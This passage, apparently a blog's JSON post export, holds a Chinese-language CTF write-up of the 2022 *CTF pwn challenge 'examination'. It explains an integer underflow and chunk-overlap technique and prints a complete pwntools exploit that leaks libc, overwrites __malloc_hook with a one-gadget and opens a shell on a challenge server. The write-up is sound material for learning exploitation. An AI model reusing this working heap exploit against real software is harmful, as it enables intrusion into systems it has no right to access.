ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">malloc_hook = libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">p = p64(heap_addr+<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(<span class=\"number\">0x100000001</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0x100000001</span>) + p64(malloc_hook) + p64(<span class=\"number\">8</span>)</span><br><span class=\"line\">t_comment(<span class=\"number\">5</span>, p, <span class=\"number\">0x300</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0xe3b2e</span>, <span class=\"number\">0xe3b31</span>, <span class=\"number\">0xe3b34</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">t_comment(<span class=\"number\">6</span>, p64(ogg[<span class=\"number\">1</span>]+libc_base), <span class=\"number\">0x300</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">t_getshell()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n","excerpt":"","more":"<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-04_%2ACTF/examination.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-04_%2ACTF/examination.zip</a></p>\n<h1 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h1><p>角色扮演的pwn题，可以切换学生和老师</p>\n<p>发现了好多漏洞，估计是考漏洞的利用，当然解法可能就不止一种</p>\n<p>主要利用的漏洞：无符号数减法负数溢出，student role下的set mode中可以修改内存中的指针导致堆块堆叠</p>\n<p>只用到一次free</p>\n<p>思路，构造一个mode chunk使得这个chunk在comment chunk1的上方，以及另一个comment chunk2在其下方，然后pray一下，将指针下移16个字节，使得可以操控comment chunk的size位置，修改size为0x421绕过tcache，释放到unsorted bin，同时布置好comment chunk2的中伪造一个size位置，这个时候重新在分配一个和comment chunk1大小相同的commend chunk就会切割unsorted bin，使得main_arena的地址向后推移，写入comment chunk2，这个时候read comment chunk2就能够泄露libc基址，同样的手法，再add student，分配的student node和test node都会切割unsorted bin中的块，这个时候切割的unsorted bin就是之前堆块堆叠导致的comment chunk2，那我们就能够控制student node和test node，修改test node中的comment地址__malloc_hook，再向malloc_hook中写入ogg，再调用teacher role的pray，就能够getshell</p>\n<p><img src=\"/p/xinCTF-pwn-wp/image-20220419112429213.png\" alt=\"image-20220419112429213\"></p>\n<p><img src=\"/p/xinCTF-pwn-wp/image-20220419112443070.png\" alt=\"image-20220419112443070\"></p>\n<h1 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.31.so&#x27;, &#x27;./examination&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;124.70.130.92&#x27;</span>, <span class=\"number\">60001</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">roleg = <span class=\"number\">0</span></span><br><span class=\"line\">idg = -<span class=\"number\">1</span></span><br><span class=\"line\">lazy_map = &#123;&#125;</span><br><span class=\"line\">reward_map = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">change_role</span>(<span class=\"params\">role</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> roleg, idg</span><br><span class=\"line\">    roleg = role</span><br><span class=\"line\">    <span class=\"keyword\">if</span> role == <span class=\"number\">0</span>:</span><br><span class=\"line\">        idg = -<span class=\"number\">1</span></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>, <span class=\"built_in\">str</span>(role))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t_addstu</span>(<span class=\"params\">quesqtion_num</span>):</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    rt = io.recv(<span class=\"number\">5</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;enter&#x27;</span> <span class=\"keyword\">in</span> rt:</span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;questions: &#x27;</span>,<span class=\"built_in\">str</span>(quesqtion_num))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> rt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t_getshell</span>():</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t_givescore</span>():</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;marking testing papers.....\\n&#x27;</span>)</span><br><span class=\"line\">    rt = io.recvuntil(<span class=\"string\">&#x27;finish\\n&#x27;</span>, drop=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    rt = rt.strip().split(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">f</span>(<span class=\"params\">ss</span>):</span><br><span class=\"line\">        ss = ss.replace(<span class=\"string\">&#x27;score for the &#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print(ss)</span></span><br><span class=\"line\">        a = <span class=\"built_in\">int</span>(ss[:ss.find(<span class=\"string\">&#x27;th&#x27;</span>)])</span><br><span class=\"line\">        b = <span class=\"built_in\">int</span>(ss[ss.find(<span class=\"string\">&#x27;is &#x27;</span>)+<span class=\"number\">3</span>:])</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (a, b)</span><br><span class=\"line\">    ans = []</span><br><span class=\"line\">    <span class=\"comment\"># print(rt)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> sr <span class=\"keyword\">in</span> rt:</span><br><span class=\"line\">        <span class=\"comment\"># print(sr)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;b@d!&#x27;</span> <span class=\"keyword\">in</span> sr:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"comment\"># print sr</span></span><br><span class=\"line\">        ans.append(f(sr))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t_comment</span>(<span class=\"params\">_<span class=\"built_in\">id</span>, comment, size</span>):</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;which one? &gt; &#x27;</span>, <span class=\"built_in\">str</span>(_<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    rt = io.recv(<span class=\"number\">5</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;pleas&#x27;</span> <span class=\"keyword\">in</span> rt:</span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;size of comment: &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;ur comment:\\n&#x27;</span>, comment)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t_free</span>(<span class=\"params\">_<span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;which student id to choose?\\n&#x27;</span>, <span class=\"built_in\">str</span>(_<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    lazy_map[_<span class=\"built_in\">id</span>] = <span class=\"number\">0</span></span><br><span class=\"line\">    reward_map[_<span class=\"built_in\">id</span>] = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">s_change_id</span>(<span class=\"params\">_<span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> idg</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">1</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;input your id: &#x27;</span>, <span class=\"built_in\">str</span>(_<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    idg = _<span class=\"built_in\">id</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">s_pray</span>(<span class=\"params\">_<span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">1</span>)</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (s_change_id(x) <span class=\"keyword\">if</span> idg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    lazy_map[_<span class=\"built_in\">id</span>] = <span class=\"number\">1</span> - lazy_map.get(_<span class=\"built_in\">id</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">s_set_mode</span>(<span class=\"params\">_<span class=\"built_in\">id</span>, mode</span>):</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">1</span>)</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (s_change_id(x) <span class=\"keyword\">if</span> idg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    rt = io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;mode&#x27;</span> <span class=\"keyword\">in</span> rt:</span><br><span class=\"line\">        io.sendline(mode)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        io.sendline(<span class=\"built_in\">str</span>(mode))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">s_check_review</span>(<span class=\"params\">_<span class=\"built_in\">id</span>, to_reward, fx, has_comment, tf=<span class=\"keyword\">lambda</span> x: x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> reward_map.get(_<span class=\"built_in\">id</span>, <span class=\"number\">0</span>) == <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> to_reward:</span><br><span class=\"line\">        s_pray(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            tmp = t_givescore()</span><br><span class=\"line\">            tmp = <span class=\"built_in\">dict</span>(tmp)</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> _<span class=\"built_in\">id</span> <span class=\"keyword\">in</span> tmp</span><br><span class=\"line\">            <span class=\"keyword\">if</span> tmp[_<span class=\"built_in\">id</span>] &lt; <span class=\"number\">10</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">1</span>)</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (s_change_id(x) <span class=\"keyword\">if</span> idg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> to_reward:</span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">&#x27;Good Job! Here is your reward! &#x27;</span>)</span><br><span class=\"line\">        target_addr = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">        tf(target_addr)</span><br><span class=\"line\">        target_addr = fx(target_addr)</span><br><span class=\"line\">        io.sendafter(<span class=\"string\">&#x27;add 1 to wherever you want! addr: &#x27;</span>, <span class=\"built_in\">str</span>(target_addr))</span><br><span class=\"line\">        reward_map[_<span class=\"built_in\">id</span>] = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> has_comment:</span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">&#x27;here is the review:\\n&#x27;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>, <span class=\"built_in\">str</span>(roleg))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    t_addstu(<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># t_comment(6, &#x27;sss&#x27;, )</span></span><br><span class=\"line\"><span class=\"comment\"># s_set_mode(3, &#x27;asdf&#x27;)</span></span><br><span class=\"line\">s_set_mode(<span class=\"number\">4</span>, <span class=\"string\">&#x27;asdf&#x27;</span>)</span><br><span class=\"line\">s_set_mode(<span class=\"number\">5</span>, <span class=\"string\">&#x27;asdf&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">t_comment(<span class=\"number\">6</span>, <span class=\"string\">&#x27;sss&#x27;</span>, <span class=\"number\">0x300</span>)</span><br><span class=\"line\">t_comment(<span class=\"number\">5</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x100</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x201</span>), <span class=\"number\">0x300</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s_pray(<span class=\"number\">5</span>)</span><br><span class=\"line\">s_set_mode(<span class=\"number\">5</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">s_pray(<span class=\"number\">5</span>)</span><br><span class=\"line\">s_set_mode(<span class=\"number\">5</span>, <span class=\"string\">&#x27;q&#x27;</span>*<span class=\"number\">8</span> + p64(<span class=\"number\">0x421</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">t_free(<span class=\"number\">6</span>)</span><br><span class=\"line\">t_comment(<span class=\"number\">4</span>, <span class=\"string\">&#x27;sss&#x27;</span>, <span class=\"number\">0x300</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s_check_review(<span class=\"number\">5</span>, <span class=\"literal\">False</span>, null, <span class=\"literal\">True</span>)</span><br><span class=\"line\">main_arena = u64(io.recv(<span class=\"number\">8</span>)) - <span class=\"number\">96</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = main_arena - <span class=\"number\">0x00001ECB80</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base: &quot;</span> + <span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">t_addstu(<span class=\"number\">1</span>)</span><br><span class=\"line\">t_comment(<span class=\"number\">6</span>, <span class=\"string\">&#x27;sss&#x27;</span>, <span class=\"number\">0x300</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">heap_addr = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ftmp</span>(<span class=\"params\">addr</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> heap_addr</span><br><span class=\"line\">    heap_addr = addr</span><br><span class=\"line\"></span><br><span class=\"line\">s_check_review(<span class=\"number\">6</span>, <span class=\"literal\">True</span>, <span class=\"keyword\">lambda</span> x: x-<span class=\"number\">0x10</span>, <span class=\"literal\">True</span>, ftmp)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;heap_addr: &#x27;</span> + <span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">malloc_hook = libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">p = p64(heap_addr+<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(<span class=\"number\">0x100000001</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0x100000001</span>) + p64(malloc_hook) + p64(<span class=\"number\">8</span>)</span><br><span class=\"line\">t_comment(<span class=\"number\">5</span>, p, <span class=\"number\">0x300</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0xe3b2e</span>, <span class=\"number\">0xe3b31</span>, <span class=\"number\">0xe3b34</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">t_comment(<span class=\"number\">6</span>, p64(ogg[<span class=\"number\">1</span>]+libc_base), <span class=\"number\">0x300</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">t_getshell()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n","path":"/p/xinCTF-pwn-wp/","permalink":"https://blog.csome.cc/p/xinCTF-pwn-wp/","tags":[{"name":"CTF","_id":"cuidhe2mLrs_RBYmTzHeWmv47","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuidE5EaGl_nziC_ifU_P2m7I","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15}],"categories":[],"prev":{"title":"[2022春秋杯] Pwn chunzhiIot wp","date":"2022-05-08T17:02:18.000Z","slug":"2022cqb-pwn-chunzhiIot","published":true,"updated":"2025-10-28T08:00:40.724Z","_id":"cuidoyYwji1umkW1tfRcX1A4u","layout":"post","photos":[],"excerpt":"","path":"/p/2022cqb-pwn-chunzhiIot/","permalink":"https://blog.csome.cc/p/2022cqb-pwn-chunzhiIot/","__post":true},"next":{"title":"[2022HFCTF] Pwn babygame","date":"2022-03-22T11:04:57.000Z","slug":"HFCTF-Pwn-babygame","published":true,"updated":"2025-10-28T08:00:40.755Z","_id":"cuidNFSvsK8ZtlWPAbpKjMaJp","layout":"post","photos":[],"excerpt":"","path":"/p/HFCTF-Pwn-babygame/","permalink":"https://blog.csome.cc/p/HFCTF-Pwn-babygame/","__post":true},"__post":true}